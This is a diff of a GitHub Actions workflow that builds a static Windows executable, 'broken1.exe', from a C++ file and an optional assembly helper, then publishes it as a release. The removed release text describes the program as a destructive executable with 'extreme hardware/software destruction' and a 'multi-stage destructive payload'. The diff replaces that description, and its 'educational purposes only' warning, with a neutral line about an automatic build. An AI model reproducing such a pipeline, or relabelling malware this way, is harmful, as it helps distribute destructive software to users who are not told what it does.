@@ -18,7 +18,9 @@ jobs:
       uses: msys2/setup-msys2@v2
       with:
         update: true
-        install: mingw-w64-x86_64-toolchain
+        install: >-
+          mingw-w64-x86_64-toolchain
+          nasm
 
     - name: Checkout repository
       uses: actions/checkout@v4
@@ -28,8 +30,18 @@ jobs:
       run: |
         export PATH="/mingw64/bin:$PATH"
         g++ --version
+        
+        # Jika ada file ASM, compile ke object
+        if [ -f "BROKEN1/helper.asm" ]; then
+          nasm -f win64 BROKEN1/helper.asm -o helper.obj
+          OBJFILES="helper.obj"
+        else
+          OBJFILES=""
+        fi
+
+        # Compile dan link C++ + ASM object (jika ada)
         g++ -O2 -Wall -Wextra -static -o broken1.exe \
-            BROKEN/broken3.cpp \
+            BROKEN1/broken.cpp $OBJFILES \
             -lwinmm -luser32 -ldwmapi -lgdi32 -lpsapi -lpthread -lshell32 -lcomdlg32 -ladvapi32 \
             -lsetupapi -lvirtdisk -lcrypt32 -lntdll \
             -mwindows -Wno-cast-function-type -Wno-missing-field-initializers
@@ -47,15 +59,9 @@ jobs:
         tag_name: ${{ github.ref_name }}
         name: Broken ${{ github.ref_name }}
         body: |
-          BROKEN DESTRUCTIVE EXECUTABLE
-          - Extreme hardware/software destruction
-          - Multi-stage destructive payload
-          - Privilege-aware destruction modes
-          - Built automatically from GitHub Actions
-          - Author: WHO-AM-I-404
-          
-          WARNING: This software is for educational purposes only!
-          Do not run on production systems or personal devices.
+          Build hasil otomatis dari workflow GitHub Actions.
+          - File utama: BROKEN1/broken.cpp
+          - Mendukung inline asm atau file .asm eksternal
         files: broken1.exe
         allowUpdates: true
       env:
